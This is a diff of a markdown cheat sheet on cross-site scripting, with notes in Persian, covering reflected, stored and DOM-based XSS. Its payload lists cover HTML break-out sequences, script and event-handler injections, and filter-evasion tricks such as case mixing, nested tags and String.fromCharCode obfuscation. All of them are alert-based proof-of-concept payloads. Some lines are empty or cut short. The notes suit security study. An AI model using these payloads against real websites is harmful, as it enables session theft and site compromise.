@@ -1,38 +1,53 @@
 # XSS
 
-##
-- بعد از تزریق کد اسکریپت، باید به page source code رفته تا اثر تزریق را در صفحه ببینیم، تا رفتار سرور و متعاقبا نحوه bypass آن را متوجه شویم
+## Concept
+- اسکریپت مقدماتی به صورت `````` است.
 
-## Types
-- Reflected
-- Stored
-- DOM Based
-  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
-    - source: ```?name=alireza => document.url()```
-    - sink: ```getElementById()``` & ```document.write()```
+
+## Exploit (Reflected & Stored)
+- تزریق کد به محتوای صفحه HTML بدون هیچ encoding
+  - ورودی های سایت مانند Search و Comment و ... 
+  - پس از تزریق اسکریپت باید به page source code رفته و بررسی کنیم که با چه کاراکترهایی می توانیم از المانی که حاوی اسکریپت ما می باشد، breake out کنیم. چند نمونه در زیر آمده است:
+```Javascript
+">
+'>
+'">
+'">');
+/">
+</title>
+```
+- س
+
+## Exploit (DOM-based)
+- Sink: ```document.write``` & Source : ```location.search```
+- Sink: ```document.write``` & Source : ```location.search```
 
 ## Payloads
 ```Javascript
-'"><script>alert(888)</script>
-"><script>alert(888)</script>
-'">');<script>alert(888)</script>
-</title><script>alert(888)</script>
+<script>alert(888)</script>
+<svg onload=alert(888)>
+```
+
+## Payloads
+```Javascript
 '; alert(888)'//
 %27;+alert(888);//
-<script>alert(888)</script>
-<SCript>alert(888)</SCript>
-<scri<script>pt>alert(888)</scri</script>pt>
-<img src='aaa' onerror='alert(888)'/>
-<img src=1 oNeRrOr=alert`888`>
-<script>prompt(888)</script>
-<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
 ";alert(888);//
 ";alert(888);"
 ';alert(888);//
 ';alert(888);'
-/"><script>alert(888)</script>
+
+<SCript>alert(888)</SCript>
+<scri<script>pt>alert(888)</scri</script>pt>
+
+<img src='aaa' onerror='alert(888)'/>
+<img src=1 oNeRrOr=alert`888`>
+
+<script>prompt(888)</script>
+
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
+
 <BODY ONLOAD=alert(888)>
-"><svg onload=alert(888)>
 ```
 
 ## xsser
